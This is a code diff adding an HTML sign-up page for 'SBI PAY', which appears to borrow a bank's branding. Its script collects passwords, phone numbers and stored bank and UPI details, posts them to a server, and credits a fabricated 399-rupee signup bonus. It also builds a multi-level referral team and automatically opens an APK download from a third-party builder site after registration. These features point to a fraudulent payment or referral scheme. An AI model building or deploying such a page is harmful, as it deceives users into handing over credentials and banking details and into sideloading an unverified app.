@@ -1,0 +1,76 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover"><title>SBI PAY - Register</title><link rel="stylesheet" href="style.css"></head><body class="inner-page"><header class="page-header"><a class="back" href="index.html" aria-label="Back">←</a><h1>Register</h1></header><main class="inner-content"><form class="auth-form compact" id="register-form"><label class="field"><span class="field-icon user-icon"></span><input id="username" type="text" placeholder="User Name" aria-label="User Name" required></label><label class="field"><span class="field-icon lock-icon"></span><input type="password" placeholder="Password" aria-label="Password" required></label><label class="field phone-field"><span class="field-icon phone-icon"></span><strong>+91</strong><i></i><input type="tel" placeholder="Phone" aria-label="Phone" required></label><label class="field"><span class="field-icon link-icon"></span><input id="invite-code" type="text" placeholder="Invite Code" aria-label="Invite Code"></label><div id="register-error" role="alert" style="min-height:20px;color:#d74d4d;text-align:center"></div><button class="primary-button" type="submit">Sign Up</button></form></main><script>
+const params=new URLSearchParams(location.search);
+const referral=params.get('ref')||params.get('invite')||params.get('inviteCode')||params.get('referral')||'';
+const apkDownloadUrl='https://www.webtonative.com/api/v1/demo/download/6aad6cdbdad8b64c33dcaeb5/ANDROID?t=1789750716729';
+const passwordInput=document.querySelector('input[type="password"]');
+const phoneInput=document.querySelector('input[type="tel"]');
+const success=document.createElement('div');
+success.id='register-success';
+success.setAttribute('role','status');
+success.style.cssText='min-height:20px;color:#129765;text-align:center';
+document.getElementById('register-form').append(success);
+const inviteInput=document.getElementById('invite-code');
+inviteInput.value=referral;
+const readJson=(key,fallback)=>{try{return JSON.parse(localStorage.getItem(key)||JSON.stringify(fallback))}catch(error){return fallback}};
+document.getElementById('register-form').addEventListener('submit',async function(event){
+  event.preventDefault();
+  const username=document.getElementById('username').value.trim();
+  const phone=phoneInput.value.replace(/\D/g,'');
+  const error=document.getElementById('register-error');
+  const password=passwordInput.value;
+  const registeredPhones=readJson('sbiPayRegisteredPhones',{});
+  if(phone.length<10){error.textContent='Enter a valid mobile number.';return}
+  if(password.length<6){error.textContent='Password must be at least 6 characters.';return}
+  if(registeredPhones[phone]){error.textContent='This mobile number is already registered.';return}
+  const savedBanks=readJson('sbiPayWalletBanks',[]);
+  const savedUpis=readJson('sbiPayWalletUpi',[]);
+  if(savedBanks.length||savedUpis.length){error.textContent='This bank account or UPI is already registered.';return}
+  try{
+    const controller=new AbortController();
+    const timeout=setTimeout(()=>controller.abort(),1500);
+    const response=await fetch('/api/register',{method:'POST',headers:{'Content-Type':'application/json'},signal:controller.signal,body:JSON.stringify({username,phone,password,userId:'',inviteCode:'',ownerCode:referral,banks:savedBanks,upis:savedUpis,preflight:true})});
+    clearTimeout(timeout);
+    if(response.status===409){error.textContent=(await response.json()).error||'These registration details are already in use.';return}
+    if(!response.ok&&response.status!==503){error.textContent='Registration could not be completed. Please try again.';return}
+  }catch(networkError){}
+  const nextUserId=Math.max(Number(localStorage.getItem('sbiPayNextUserId')||284041),284041);
+  const userId=String(nextUserId);
+  localStorage.setItem('sbiPayNextUserId',String(nextUserId+1));
+  const inviteCode=`SBI${userId}`;
+  const owners=readJson('sbiPayReferralOwners',{});
+  const parent=owners[referral]||null;
+  const profile={username,id:userId,inviteCode,ownerCode:referral,createdAt:new Date().toISOString()};
+  localStorage.setItem('sbiPayUsername',username);
+  localStorage.setItem('sbiPayProfile',JSON.stringify(profile));
+  localStorage.setItem('sbiPayUserId',userId);
+  registeredPhones[phone]=userId;
+  localStorage.setItem('sbiPayRegisteredPhones',JSON.stringify(registeredPhones));
+  localStorage.setItem('sbiPayInviteCode',inviteCode);
+  localStorage.setItem('sbiPayStartingBalance','0');
+  localStorage.removeItem('sbiPayTransactions');
+  localStorage.removeItem('sbiPaySellerSales');
+  localStorage.removeItem('sbiPayOrderLocks');
+  localStorage.removeItem('sbiPayBuyerId');
+  localStorage.removeItem('sbiPayWalletUpi');
+  localStorage.removeItem('sbiPayWalletBanks');
+  localStorage.setItem('sbiPayTransactions',JSON.stringify([{id:`signup-bonus-${userId}`,code:`BONUS${userId}`,type:'INR',currency:'INR',label:'Signup Bonus / Gift',direction:'receive',amount:399,status:'success',date:new Date().toISOString()}]));
+  owners[inviteCode]=profile;
+  localStorage.setItem('sbiPayReferralOwners',JSON.stringify(owners));
+  if(parent){
+    const members=readJson('sbiPayTeamMembers',[]);
+    members.push({username,id:userId,inviteCode,referral,ownerCode:referral,level:parent.ownerCode?'C':'B',activity:0,joinedAt:new Date().toISOString()});
+    localStorage.setItem('sbiPayTeamMembers',JSON.stringify(members));
+  }
+  try{
+    const controller=new AbortController();
+    const timeout=setTimeout(()=>controller.abort(),1500);
+    const response=await fetch('/api/register',{method:'POST',headers:{'Content-Type':'application/json'},signal:controller.signal,body:JSON.stringify({username,phone,password,userId,inviteCode,ownerCode:referral,banks:savedBanks,upis:savedUpis})});
+    clearTimeout(timeout);
+    if(response.status===409){error.textContent=(await response.json()).error||'These registration details are already in use.';return}
+  }catch(networkError){}
+  success.textContent='Registration Successful';
+  document.querySelector('.primary-button').disabled=true;
+  setTimeout(()=>{window.open(apkDownloadUrl,'_blank','noopener');window.location.href='dashboard.html'},900);
+});
+</script></body></html>
